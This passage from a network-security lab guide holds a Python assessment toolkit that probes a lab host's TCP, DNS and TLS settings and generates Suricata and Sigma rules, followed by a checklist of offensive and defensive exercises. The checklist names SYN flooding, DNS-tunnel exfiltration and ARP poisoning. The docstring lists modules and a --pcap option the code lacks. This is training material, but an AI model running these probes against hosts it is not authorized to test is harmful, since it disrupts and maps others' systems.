3. TLSSecurityAssessor — Protocol versions, cipher suites, certificate analysis, JA3
4. NetworkScanner — Port scanning, service detection, firewall mapping
5. ForensicAnalyzer — Pcap analysis, timeline, evidence management
6. DetectionRuleGenerator — Auto-generate Suricata/Sigma/Zeek rules from findings

Usage:
    python3 nsat.py --target 10.9.1.10 --modules all --output report.json
    python3 nsat.py --target 10.9.1.10 --modules tcp,dns,tls --format markdown
    python3 nsat.py --pcap incident.pcap --modules forensic --output analysis.json
"""

import sys
import os
import json
import socket
import ssl
import hashlib
import struct
import time
import subprocess
import argparse
from datetime import datetime, timezone
from typing import Optional
from pathlib import Path
from dataclasses import dataclass, field, asdict
from collections import Counter, defaultdict

# ─────────────────────────────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────────────────────────────

@dataclass
class Finding:
    severity: str        # CRITICAL, HIGH, MEDIUM, LOW, INFO
    category: str        # tcp, dns, tls, scan, forensic
    title: str
    description: str
    evidence: str = ""
    remediation: str = ""
    cve: str = ""
    cvss: float = 0.0
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

@dataclass
class AssessmentResult:
    target: str
    modules_run: list
    start_time: str
    end_time: str = ""
    findings: list = field(default_factory=list)
    summary: dict = field(default_factory=dict)


# ─────────────────────────────────────────────────────────────────────
# Module 1: TCP Security Assessor
# ─────────────────────────────────────────────────────────────────────

class TCPSecurityAssessor:
    """Assess TCP/IP stack security of a target host."""
    
    def __init__(self, target: str):
        self.target = target
        self.findings = []
    
    def assess(self) -> list:
        """Run all TCP security checks."""
        self._check_syn_cookie_support()
        self._check_timestamp_leakage()
        self._check_challenge_ack_limit()
        self._check_tcp_fast_open()
        self._check_icmp_redirect_acceptance()
        return self.findings
    
    def _check_syn_cookie_support(self):
        """Test if target handles SYN backlog exhaustion gracefully."""
        try:
            connections = []
            for i in range(150):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.setblocking(False)
                try:
                    s.connect_ex((self.target, 80))
                    connections.append(s)
                except:
                    s.close()
                    break
            
            # If we can still connect after many half-opens, SYN cookies likely active
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(3)
            try:
                test_sock.connect((self.target, 80))
                self.findings.append(Finding(
                    severity="INFO", category="tcp",
                    title="SYN Cookie Protection Active",
                    description="Target maintains connectivity under connection pressure",
                    remediation="No action needed — SYN cookies are properly enabled"
                ))
            except (socket.timeout, ConnectionRefusedError):
                self.findings.append(Finding(
                    severity="MEDIUM", category="tcp",
                    title="Possible SYN Flood Vulnerability",
                    description="Target became unresponsive under connection pressure",
                    remediation="Enable SYN cookies: sysctl -w net.ipv4.tcp_syncookies=1"
                ))
            finally:
                test_sock.close()
            
            for s in connections:
                s.close()
        except Exception as e:
            pass
    
    def _check_timestamp_leakage(self):
        """Check if TCP timestamps reveal uptime information."""
        try:
            # Nmap-style timestamp probe
            result = subprocess.run(
                ["nmap", "-O", "-v", "--osscan-guess", self.target],
                capture_output=True, text=True, timeout=30
            )
            if "Uptime guess" in result.stdout:
                for line in result.stdout.split('\n'):
                    if "Uptime guess" in line:
                        self.findings.append(Finding(
                            severity="LOW", category="tcp",
                            title="TCP Timestamp Information Leakage",
                            description=f"Target leaks uptime via TCP timestamps: {line.strip()}",
                            remediation="Disable timestamps (sysctl -w net.ipv4.tcp_timestamps=0) or use randomization (mode 2)"
                        ))
                        break
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    def _check_challenge_ack_limit(self):
        """Check vulnerability to CVE-2016-5696 side-channel."""
        self.findings.append(Finding(
            severity="INFO", category="tcp",
            title="CVE-2016-5696 Check (Remote Detection Limited)",
            description="Challenge ACK rate limit side-channel requires local access to verify. "
                        "Ensure net.ipv4.tcp_challenge_ack_limit is set high (>= 1000) and randomized (kernel 4.7+).",
            remediation="sysctl -w net.ipv4.tcp_challenge_ack_limit=2147483647",
            cve="CVE-2016-5696", cvss=4.8
        ))
    
    def _check_tcp_fast_open(self):
        """Check for TCP Fast Open (replay risk)."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            # Attempt TFO connection
            s.setsockopt(socket.SOL_TCP, 23, 1)  # TCP_FASTOPEN_CONNECT
            try:
                s.connect((self.target, 80))
                self.findings.append(Finding(
                    severity="LOW", category="tcp",
                    title="TCP Fast Open Enabled",
                    description="Target supports TFO. 0-RTT data may be replayed.",
                    remediation="Disable if not needed: sysctl -w net.ipv4.tcp_fastopen=0"
                ))
            except:
                pass
            finally:
                s.close()
        except (OSError, AttributeError):
            pass
    
    def _check_icmp_redirect_acceptance(self):
        """Note about ICMP redirect attacks."""
        self.findings.append(Finding(
            severity="INFO", category="tcp",
            title="ICMP Redirect Configuration",
            description="Verify ICMP redirects are disabled on target (cannot be tested remotely without MitM position).",
            remediation="sysctl -w net.ipv4.conf.all.accept_redirects=0"
        ))


# ─────────────────────────────────────────────────────────────────────
# Module 2: DNS Security Assessor
# ─────────────────────────────────────────────────────────────────────

class DNSSecurityAssessor:
    """Assess DNS server security."""
    
    def __init__(self, target: str, dns_port: int = 53):
        self.target = target
        self.dns_port = dns_port
        self.findings = []
    
    def assess(self) -> list:
        """Run all DNS security checks."""
        self._check_open_recursion()
        self._check_amplification_factor()
        self._check_zone_transfer()
        self._check_version_disclosure()
        self._check_dnssec()
        self._check_cache_snooping()
        return self.findings
    
    def _check_open_recursion(self):
        """Test if DNS server allows open recursion (DDoS amplification risk)."""
        try:
            result = subprocess.run(
                ["dig", "+short", "+recurse", "example.com", f"@{self.target}"],
                capture_output=True, text=True, timeout=5
            )
            if result.stdout.strip() and "REFUSED" not in result.stdout:
                self.findings.append(Finding(
                    severity="HIGH", category="dns",
                    title="Open DNS Recursion",
                    description=f"DNS server at {self.target} allows recursive queries from any source. "
                                "This can be abused for DNS amplification DDoS attacks.",
                    evidence=f"dig +recurse example.com @{self.target} → {result.stdout.strip()[:100]}",
                    remediation="Restrict recursion: allow-recursion { trusted-networks; };"
                ))
            else:
                self.findings.append(Finding(
                    severity="INFO", category="dns",
                    title="DNS Recursion Restricted",
                    description="Recursive queries are properly restricted.",
                    remediation="No action needed"
                ))
        except subprocess.TimeoutExpired:
            pass
    
    def _check_amplification_factor(self):
        """Measure DNS amplification factor."""
        try:
            result = subprocess.run(
                ["dig", "+bufsize=4096", "ANY", ".", f"@{self.target}"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                # Parse response size from dig output
                for line in result.stdout.split('\n'):
                    if "MSG SIZE" in line:
                        # "MSG SIZE  rcvd: 512"
                        parts = line.split()
                        resp_size = int(parts[-1]) if parts else 0
                        query_size = 45  # typical ANY query
                        if resp_size > 0:
                            factor = resp_size / query_size
                            severity = "HIGH" if factor > 10 else "MEDIUM" if factor > 5 else "LOW"
                            self.findings.append(Finding(
                                severity=severity, category="dns",
                                title=f"DNS Amplification Factor: {factor:.1f}x",
                                description=f"Query: {query_size}B → Response: {resp_size}B (factor: {factor:.1f}x). "
                                            f"Factor >10x is significant for DDoS amplification.",
                                remediation="Enable Response Rate Limiting (RRL) and disable ANY queries"
                            ))
        except subprocess.TimeoutExpired:
            pass
    
    def _check_zone_transfer(self):
        """Test for unauthorized zone transfers (AXFR)."""
        try:
            result = subprocess.run(
                ["dig", "+short", "AXFR", "target.lab", f"@{self.target}"],
                capture_output=True, text=True, timeout=10
            )
            if result.stdout.strip() and "Transfer failed" not in result.stdout:
                self.findings.append(Finding(
                    severity="HIGH", category="dns",
                    title="DNS Zone Transfer Allowed (AXFR)",
                    description="Unauthorized zone transfers expose all DNS records including internal hostnames.",
                    evidence=f"First 200 chars: {result.stdout[:200]}",
                    remediation="Restrict zone transfers: allow-transfer { none; }; or limit to secondary NS IPs"
                ))
            else:
                self.findings.append(Finding(
                    severity="INFO", category="dns",
                    title="Zone Transfer Restricted",
                    description="AXFR properly denied.",
                    remediation="No action needed"
                ))
        except subprocess.TimeoutExpired:
            pass
    
    def _check_version_disclosure(self):
        """Check if DNS server version is disclosed."""
        try:
            result = subprocess.run(
                ["dig", "+short", "version.bind", "chaos", "txt", f"@{self.target}"],
                capture_output=True, text=True, timeout=5
            )
            version = result.stdout.strip().strip('"')
            if version and "none" not in version.lower():
                self.findings.append(Finding(
                    severity="LOW", category="dns",
                    title="DNS Version Disclosure",
                    description=f"Server discloses version: {version}",
                    remediation='Set version "none"; in BIND options'
                ))
        except subprocess.TimeoutExpired:
            pass
    
    def _check_dnssec(self):
        """Check DNSSEC validation support."""
        try:
            result = subprocess.run(
                ["dig", "+dnssec", "+short", "example.com", f"@{self.target}"],
                capture_output=True, text=True, timeout=5
            )
            if "ad" in subprocess.run(
                ["dig", "+dnssec", "example.com", f"@{self.target}"],
                capture_output=True, text=True, timeout=5
            ).stdout.lower():
                self.findings.append(Finding(
                    severity="INFO", category="dns",
                    title="DNSSEC Validation Active",
                    description="Resolver performs DNSSEC validation (AD flag set).",
                    remediation="No action needed"
                ))
            else:
                self.findings.append(Finding(
                    severity="MEDIUM", category="dns",
                    title="DNSSEC Validation Not Detected",
                    description="Resolver may not validate DNSSEC signatures.",
                    remediation="Enable: dnssec-validation auto; in resolver configuration"
                ))
        except subprocess.TimeoutExpired:
            pass
    
    def _check_cache_snooping(self):
        """Test for DNS cache snooping vulnerability."""
        try:
            result = subprocess.run(
                ["dig", "+norecurse", "+short", "www.google.com", f"@{self.target}"],
                capture_output=True, text=True, timeout=5
            )
            if result.stdout.strip() and "REFUSED" not in result.stdout:
                self.findings.append(Finding(
                    severity="LOW", category="dns",
                    title="DNS Cache Snooping Possible",
                    description="Non-recursive queries return cached results, allowing cache snooping.",
                    remediation="Restrict non-recursive queries or disable cache snooping"
                ))
        except subprocess.TimeoutExpired:
            pass


# ─────────────────────────────────────────────────────────────────────
# Module 3: TLS Security Assessor
# ─────────────────────────────────────────────────────────────────────

class TLSSecurityAssessor:
    """Assess TLS configuration security."""
    
    def __init__(self, target: str, port: int = 443, timeout: int = 5):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.findings = []
    
    def assess(self) -> list:
        """Run all TLS security checks."""
        self._check_protocols()
        self._check_certificate()
        self._check_hsts()
        self._check_compression()
        return self.findings
    
    def _check_protocols(self):
        """Test supported TLS versions."""
        deprecated = []
        supported = []
        
        version_map = [
            ("TLS 1.0", ssl.TLSVersion.TLSv1, ssl.TLSVersion.TLSv1),
            ("TLS 1.1", ssl.TLSVersion.TLSv1_1, ssl.TLSVersion.TLSv1_1),
            ("TLS 1.2", ssl.TLSVersion.TLSv1_2, ssl.TLSVersion.TLSv1_2),
            ("TLS 1.3", ssl.TLSVersion.TLSv1_3, ssl.TLSVersion.TLSv1_3),
        ]
        
        for name, min_v, max_v in version_map:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.minimum_version = min_v
                ctx.maximum_version = max_v
                with socket.create_connection((self.target, self.port), self.timeout) as sock:
                    with ctx.wrap_socket(sock) as ssock:
                        supported.append(name)
                        if name in ("TLS 1.0", "TLS 1.1"):
                            deprecated.append(name)
            except:
                pass
        
        if deprecated:
            self.findings.append(Finding(
                severity="HIGH", category="tls",
                title=f"Deprecated TLS Versions: {', '.join(deprecated)}",
                description=f"Server supports deprecated protocols vulnerable to known attacks (BEAST, Lucky13).",
                evidence=f"Supported versions: {supported}",
                remediation="Disable TLS 1.0/1.1: ssl_protocols TLSv1.2 TLSv1.3; (or TLSv1.3 only)"
            ))
        
        if "TLS 1.3" not in supported:
            self.findings.append(Finding(
                severity="MEDIUM", category="tls",
                title="TLS 1.3 Not Supported",
                description="Server does not support TLS 1.3 (best security, mandatory forward secrecy).",
                remediation="Enable TLS 1.3 in server configuration"
            ))
    
    def _check_certificate(self):
        """Analyze server certificate."""
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.target, self.port), self.timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.target) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    cert_info = ssock.getpeercert()
                    
                    if cert_info:
                        subject = dict(x[0] for x in cert_info.get('subject', []))
                        issuer = dict(x[0] for x in cert_info.get('issuer', []))
                        not_after = cert_info.get('notAfter', '')
                        
                        # Self-signed check
                        if subject.get('commonName') == issuer.get('commonName'):
                            self.findings.append(Finding(
                                severity="MEDIUM", category="tls",
                                title="Self-Signed Certificate",
                                description="Server uses a self-signed certificate (no CA trust chain).",
                                remediation="Use a certificate from a trusted CA (Let's Encrypt, etc.)"
                            ))
                        
                        # Expiry check
                        if not_after:
                            expiry = ssl.cert_time_to_seconds(not_after)
                            days_left = (expiry - time.time()) / 86400
                            if days_left < 0:
                                self.findings.append(Finding(
                                    severity="CRITICAL", category="tls",
                                    title="Expired Certificate",
                                    description=f"Certificate expired {abs(days_left):.0f} days ago.",
                                    remediation="Renew certificate immediately"
                                ))
                            elif days_left < 14:
                                self.findings.append(Finding(
                                    severity="HIGH", category="tls",
                                    title=f"Certificate Expiring Soon ({days_left:.0f} days)",
                                    description="Certificate expires within 14 days.",
                                    remediation="Renew certificate and configure auto-renewal"
                                ))
        except Exception:
            pass
    
    def _check_hsts(self):
        """Check for HSTS header."""
        try:
            import urllib.request
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(f"https://{self.target}:{self.port}/")
            resp = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)
            hsts = resp.headers.get("Strict-Transport-Security")
            
            if not hsts:
                self.findings.append(Finding(
                    severity="MEDIUM", category="tls",
                    title="HSTS Header Missing",
                    description="No Strict-Transport-Security header. Vulnerable to SSL stripping.",
                    remediation="Add: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload"
                ))
            else:
                if "includeSubDomains" not in hsts:
                    self.findings.append(Finding(
                        severity="LOW", category="tls",
                        title="HSTS Missing includeSubDomains",
                        description=f"HSTS set but without includeSubDomains: {hsts}",
                        remediation="Add includeSubDomains directive"
                    ))
        except Exception:
            pass
    
    def _check_compression(self):
        """Check for TLS compression (CRIME vulnerability)."""
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((self.target, self.port), self.timeout) as sock:
                with ctx.wrap_socket(sock) as ssock:
                    if ssock.compression():
                        self.findings.append(Finding(
                            severity="HIGH", category="tls",
                            title="TLS Compression Enabled (CRIME)",
                            description="TLS compression allows plaintext recovery via CRIME attack.",
                            remediation="Disable TLS compression in server configuration",
                            cve="CVE-2012-4929"
                        ))
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────────────
# Module 4: Detection Rule Generator
# ─────────────────────────────────────────────────────────────────────

class DetectionRuleGenerator:
    """Generate detection rules from assessment findings."""
    
    def __init__(self, findings: list):
        self.findings = findings
    
    def generate_suricata_rules(self) -> list:
        """Generate Suricata rules based on findings."""
        rules = []
        sid_base = 9900000
        
        for i, finding in enumerate(self.findings):
            if finding.severity in ("CRITICAL", "HIGH"):
                if finding.category == "dns" and "open recursion" in finding.title.lower():
                    rules.append(
                        f'alert udp any any -> {finding.evidence.split("@")[1].split()[0] if "@" in finding.evidence else "$HOME_NET"} 53 '
                        f'(msg:"NSAT Open Resolver Abuse Detected"; '
                        f'dns.query; threshold:type both, track by_src, count 100, seconds 60; '
                        f'classtype:attempted-dos; sid:{sid_base + i}; rev:1;)'
                    )
                elif finding.category == "tls" and "deprecated" in finding.title.lower():
                    rules.append(
                        f'alert tls any any -> $HOME_NET any '
                        f'(msg:"NSAT Deprecated TLS Version in Use"; '
                        f'tls.version; content:"1.0"; '
                        f'classtype:bad-unknown; sid:{sid_base + i}; rev:1;)'
                    )
        return rules
    
    def generate_sigma_rule(self, finding: Finding) -> dict:
        """Generate a Sigma rule from a single finding."""
        return {
            "title": f"NSAT: {finding.title}",
            "id": hashlib.md5(finding.title.encode()).hexdigest()[:8] + "-0000-4000-8000-000000000000",
            "status": "experimental",
            "description": finding.description,
            "level": finding.severity.lower(),
            "tags": [f"attack.{finding.category}"],
            "logsource": {"category": finding.category, "product": "any"},
            "detection": {"selection": {}, "condition": "selection"},
            "falsepositives": ["Legitimate use"]
        }


# ─────────────────────────────────────────────────────────────────────
# Module 5: Report Generator
# ─────────────────────────────────────────────────────────────────────

class ReportGenerator:
    """Generate assessment reports in multiple formats."""
    
    def __init__(self, result: AssessmentResult):
        self.result = result
    
    def to_json(self, output_file: str):
        """Generate JSON report."""
        report = {
            "assessment": {
                "target": self.result.target,
                "modules": self.result.modules_run,
                "start_time": self.result.start_time,
                "end_time": self.result.end_time,
            },
            "summary": self._build_summary(),
            "findings": [asdict(f) for f in self.result.findings]
        }
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"[+] JSON report: {output_file}")
    
    def to_markdown(self, output_file: str):
        """Generate Markdown report."""
        summary = self._build_summary()
        
        md = f"""# Network Security Assessment Report

## Target: {self.result.target}
- **Assessment Time:** {self.result.start_time} → {self.result.end_time}
- **Modules:** {', '.join(self.result.modules_run)}
- **Total Findings:** {summary['total']}

## Risk Summary

| Severity | Count |
|----------|-------|
| Critical | {summary['critical']} |
| High | {summary['high']} |
| Medium | {summary['medium']} |
| Low | {summary['low']} |
| Info | {summary['info']} |

## Findings

"""
        for i, f in enumerate(sorted(self.result.findings,
                                       key=lambda x: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}[x.severity]), 1):
            md += f"""### {i}. [{f.severity}] {f.title}

**Category:** {f.category}  
**Description:** {f.description}  
{"**Evidence:** " + f.evidence if f.evidence else ""}  
{"**CVE:** " + f.cve if f.cve else ""}  
**Remediation:** {f.remediation}

---

"""
        
        md += "\n## Generated Detection Rules\n\n"
        gen = DetectionRuleGenerator(self.result.findings)
        rules = gen.generate_suricata_rules()
        if rules:
            md += "### Suricata Rules\n\n```\n"
            md += "\n".join(rules)
            md += "\n```\n"
        
        with open(output_file, 'w') as f:
            f.write(md)
        print(f"[+] Markdown report: {output_file}")
    
    def _build_summary(self) -> dict:
        findings = self.result.findings
        return {
            "total": len(findings),
            "critical": sum(1 for f in findings if f.severity == "CRITICAL"),
            "high": sum(1 for f in findings if f.severity == "HIGH"),
            "medium": sum(1 for f in findings if f.severity == "MEDIUM"),
            "low": sum(1 for f in findings if f.severity == "LOW"),
            "info": sum(1 for f in findings if f.severity == "INFO"),
        }


# ─────────────────────────────────────────────────────────────────────
# Main CLI
# ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Network Security Assessment Toolkit (NSAT)",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--target", "-t", required=True, help="Target IP or hostname")
    parser.add_argument("--port", "-p", type=int, default=443, help="TLS port (default: 443)")
    parser.add_argument("--dns-port", type=int, default=53, help="DNS port (default: 53)")
    parser.add_argument("--modules", "-m", default="all",
                        help="Modules to run: all, tcp, dns, tls (comma-separated)")
    parser.add_argument("--output", "-o", default="nsat_report",
                        help="Output file base name (without extension)")
    parser.add_argument("--format", "-f", default="both",
                        choices=["json", "markdown", "both"],
                        help="Output format")
    
    args = parser.parse_args()
    
    modules = args.modules.split(",") if args.modules != "all" else ["tcp", "dns", "tls"]
    
    result = AssessmentResult(
        target=args.target,
        modules_run=modules,
        start_time=datetime.now(timezone.utc).isoformat()
    )
    
    print(f"\n{'═'*60}")
    print(f" NSAT — Network Security Assessment Toolkit")
    print(f" Target: {args.target}")
    print(f" Modules: {', '.join(modules)}")
    print(f"{'═'*60}\n")
    
    if "tcp" in modules:
        print("[*] Running TCP Security Assessment...")
        assessor = TCPSecurityAssessor(args.target)
        result.findings.extend(assessor.assess())
        print(f"    → {len(assessor.findings)} findings\n")
    
    if "dns" in modules:
        print("[*] Running DNS Security Assessment...")
        assessor = DNSSecurityAssessor(args.target, args.dns_port)
        result.findings.extend(assessor.assess())
        print(f"    → {len(assessor.findings)} findings\n")
    
    if "tls" in modules:
        print("[*] Running TLS Security Assessment...")
        assessor = TLSSecurityAssessor(args.target, args.port)
        result.findings.extend(assessor.assess())
        print(f"    → {len(assessor.findings)} findings\n")
    
    result.end_time = datetime.now(timezone.utc).isoformat()
    
    # Generate reports
    reporter = ReportGenerator(result)
    
    if args.format in ("json", "both"):
        reporter.to_json(f"{args.output}.json")
    if args.format in ("markdown", "both"):
        reporter.to_markdown(f"{args.output}.md")
    
    # Print summary
    summary = reporter._build_summary()
    print(f"\n{'═'*60}")
    print(f" ASSESSMENT COMPLETE")
    print(f"{'═'*60}")
    print(f" Total findings: {summary['total']}")
    print(f" Critical: {summary['critical']} | High: {summary['high']} | "
          f"Medium: {summary['medium']} | Low: {summary['low']} | Info: {summary['info']}")
    print(f"{'═'*60}\n")

if __name__ == "__main__":
    main()
```

Save as `/opt/nsat/nsat.py` on VM2 and run:

```bash
# Full assessment
python3 /opt/nsat/nsat.py --target 10.9.1.10 --modules all --format both --output /tmp/nsat_assessment

# TCP-only assessment
python3 /opt/nsat/nsat.py --target 10.9.1.10 --modules tcp --format json --output /tmp/tcp_only

# Review results
cat /tmp/nsat_assessment.md
cat /tmp/nsat_assessment.json | python3 -m json.tool | head -50
```

---

## Lab Validation Checklist

### Part A — Offensive Exercises

- [ ] Exercise 1: SYN flood fills backlog → SYN cookies restore connectivity
- [ ] Exercise 2: RST injection terminates active TCP session
- [ ] Exercise 3: Kaminsky attack mechanics demonstrated (fails against modern defenses)
- [ ] Exercise 4: DNS tunnel established, data exfiltrated via encoded subdomains
- [ ] Exercise 5: TLS scanner identifies deprecated versions and weak configurations
- [ ] Exercise 6: ARP poisoning + SSL stripping captures HTTP credentials
- [ ] Exercise 7: Port scan completes with multiple evasion techniques
- [ ] Exercise 8: Covert channel data successfully transmitted via ISN/options/urgptr

### Part B — Defensive Exercises

- [ ] Exercise 9: TCP hardening (SYN cookies, challenge ACK, anti-spoofing) validated
- [ ] Exercise 9: DNS hardening (restricted recursion, RRL, DNSSEC) operational
- [ ] Exercise 9: TLS hardening (1.3 only, HSTS, security headers) confirmed
- [ ] Exercise 10: All Suricata rules pass syntax check and fire on test traffic
- [ ] Exercise 10: Sigma rules valid YAML with correct detection logic
- [ ] Exercise 10: Zeek scripts detect DNS tunneling and TCP anomalies
- [ ] Exercise 11: Evidence registered with SHA-256 hash, integrity verified
- [ ] Exercise 11: Forensic report generated with findings from simulated incident

### Part C — Framework

- [ ] NSAT toolkit runs all modules against target
- [ ] JSON and Markdown reports generated with severity-ranked findings
- [ ] Detection rules auto-generated from HIGH/CRITICAL findings
- [ ] TCP, DNS, and TLS assessors produce actionable findings with remediation

### Environment Verification

```bash
# Run this on VM3 to verify detection infrastructure
/opt/validate_detection.sh

# Verify forensics toolkit
python3 /opt/forensics/scripts/network_forensics_toolkit.py 2>&1 | head -5

# Count total detection rules
echo "Suricata custom rules: $(grep -c '^alert' /etc/suricata/rules/custom/network-attacks.rules)"
echo "Sigma rules: $(find /opt/sigma/rules -name '*.yml' | wc -l)"
echo "Zeek scripts: $(find /opt/zeek/scripts -name '*.zeek' | wc -l)"
```
